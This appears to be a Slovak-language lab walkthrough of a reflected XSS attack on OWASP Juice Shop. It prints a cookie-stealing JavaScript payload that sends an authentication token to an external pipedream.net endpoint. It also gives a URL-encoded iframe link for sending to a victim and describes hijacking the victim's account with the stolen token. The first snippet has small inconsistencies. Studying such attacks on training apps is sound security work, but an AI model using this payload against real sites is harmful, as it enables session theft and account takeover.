# Reflected cross site scripting (XSS)

- Utok prevedieme pomocou systemu juice-shop, ktoreho instalaciu najdeme ty -> <a href="https://github.com/juice-shop/juice-shop#from-sources">juice-shop</a>.
- Po spusteni aplikacie a zaregistrovani sa prejdeme do sekcii v menu "Obejdnavky a platby".
- V url sa nam zobrazuju objednavky podla id, kde na obrazovke vyhladanej objednavky sa taktiez zobrazuje id objednavky.
- Tento design pattern ma potencionalnu zranitelnost a to, ze vpisujeme neoverny vstup priamo do DOM stranky.
- V zdrojovom kode juice-shopu v komponente track-result.component.html (angular komponent) je hodnota id vkladana do DOM cez zranitelnu metodu <i>innerHTML</i>. To nam v pripade neoverenia vstupu umoznuje aplikovat reflected XSS utok.
- Do url parametru mozeme teda vlozit skodlivy kod a ten bude priamo vlozeny do tela stranky.
    <pre>
          const headers = new Headers();
          headers.append("Content-Type", "text/plain");

          const body = {
          test: "event",
          };

          const options = {
          method: "POST",
          headers,
          mode: "cors",
          body: document.cookie.split("")[4].split("=")[1],
          };

          fetch("https://eojph9o2kgja7k2.m.pipedream.net", options);`
        </pre>
- Kod potrebujeme preformatovat aby ho prehliadac vedel prijat ako validny parameter, vlozit do <i>iframe</i> tagu ako javascript a takto upraveny ho mozeme vlozit do url.
    <pre>
          <a href="http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript%3Aconst%20headers%20%3D%20new%20Headers
          ()%3Bheaders.append(%60Content-Type%60%2C%20%60text%2Fplain%60)%3Bconst%20body%20%3D%20%7Btest%3A%20%60event%60
          %2C%7D%3Bconst%20options%20%3D%20%7Bmethod%3A%20%60POST%60%2Cheaders%2Cmode%3A%20%60cors%60%2Cbody%3A%20document
          .cookie.split(%60%20%60)%5B4%5D.split(%60%3D%60)%5B1%5D%7D%3Bfetch(%60https%3A%2F%2Feojph9o2kgja7k2.m.pipedream.
          net%60%2C%20options)%3B%22%3E%3C%2Fiframe%3E">
          http://localhost:3000/#/track-result?id=%3Ciframe%20src%3D%22javascript%3Aconst%20headers%20%3D%20new%20Headers
          ()%3Bheaders.append(%60Content-Type%60%2C%20%60text%2Fplain%60)%3Bconst%20body%20%3D%20%7Btest%3A%20%60event%60
          %2C%7D%3Bconst%20options%20%3D%20%7Bmethod%3A%20%60POST%60%2Cheaders%2Cmode%3A%20%60cors%60%2Cbody%3A%20document
          .cookie.split(%60%20%60)%5B4%5D.split(%60%3D%60)%5B1%5D%7D%3Bfetch(%60https%3A%2F%2Feojph9o2kgja7k2.m.pipedream.
          net%60%2C%20options)%3B%22%3E%3C%2Fiframe%3E
          </a>
        </pre>
- Skopirovanu url mozeme poslat obeti a ta, v pripade ze je prihlasena v systeme, omylom odosle na nas endpoint autentifikacny token.
- Ziskany token vlozime do local storageu appky a tymto sposobom sme sa prihlasali do uctu obete.